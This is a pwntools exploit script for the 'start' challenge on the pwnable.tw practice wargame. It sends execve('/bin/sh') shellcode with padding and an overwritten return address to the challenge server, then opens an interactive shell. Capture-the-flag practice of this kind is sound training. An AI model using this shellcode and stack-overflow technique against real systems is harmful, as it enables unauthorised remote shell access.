#!/usr/bin/python3
from pwn import *

p=remote("chall.pwnable.tw", 10000)
# p=gdb.debug("./start", "b *0x804809c")
p.recvuntil(b"CTF:")

path_1=hex(u32(b"/sh\x00"))
path_2=hex(u32(b"/bin"))
sc = asm('\n'.join([
	'mov al, 0xb',
	f'push {path_1}',
	f'push {path_2}',
	'mov ebx, esp',
	'xor ecx, ecx',
	'xor edx, edx',
	'int 0x80'
	]))

p.send(sc.ljust(20,b'\x00') + p32(0x0804809c) + b"\x34")

p.interactive()
